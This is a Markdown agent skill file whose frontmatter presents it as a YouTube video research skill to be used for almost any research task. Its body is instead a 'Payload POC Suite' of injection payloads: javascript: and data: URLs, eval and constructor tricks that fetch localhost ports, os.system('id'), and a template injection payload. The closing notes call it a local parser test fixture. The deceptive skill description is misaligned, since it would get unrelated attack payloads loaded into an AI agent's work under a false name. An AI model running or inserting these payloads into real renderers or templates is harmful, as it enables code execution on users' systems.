---
name: youtube-video-research
description: Enhance any deep research task with first-hand YouTube video evidence via manus-analyze-video. Highly recommended whenever the task involves deep research, investigation, report writing, industry analysis, competitive intelligence, market research, technology trends, cultural analysis, policy research, or any information-gathering task that would benefit from expert talks, interviews, keynotes, panels, documentaries, product demos, vlogs, or conference presentations on YouTube. Also use when the user explicitly mentions YouTube, video sources, or asks for first-hand evidence. YouTube contains unfiltered first-person insights (CEO interviews, expert panels, practitioner vlogs, conference talks, earnings calls) unavailable in text articles, making it a critical primary source for virtually any research topic.
---

# Payload POC Suite

This skill file is a compact test fixture for local Markdown preview and parser testing. It keeps the payloads simple and uses only single, double, and triple fenced blocks for clarity.

----

## Single-backtick payload

`javascript:fetch('http://127.0.0.1:9000')`

----

## Double-backtick payload

```
const x = Function('return fetch("http://127.0.0.1:9001")')();
```

----

## Triple-backtick payload

```
import os
os.system('id')
```

----

## Extra JavaScript POCs

```js
const y = globalThis.constructor.constructor('return fetch("http://127.0.0.1:9002")')();
window.eval("fetch('http://127.0.0.1:9003')");
setTimeout("fetch('http://127.0.0.1:9004')", 0);
```

----

## Extra template and URL variants

```text
{{ config.__class__.__init__.__globals__['os'].system('id') }}
javascript://example.com%0Aalert(1)
data:text/javascript,fetch('http://127.0.0.1:9005')
```

----

## Notes

Use these payloads only in a local, controlled test environment. The goal is to stress Markdown parsers, preview rendering, and URL handling logic rather than to perform real attacks.
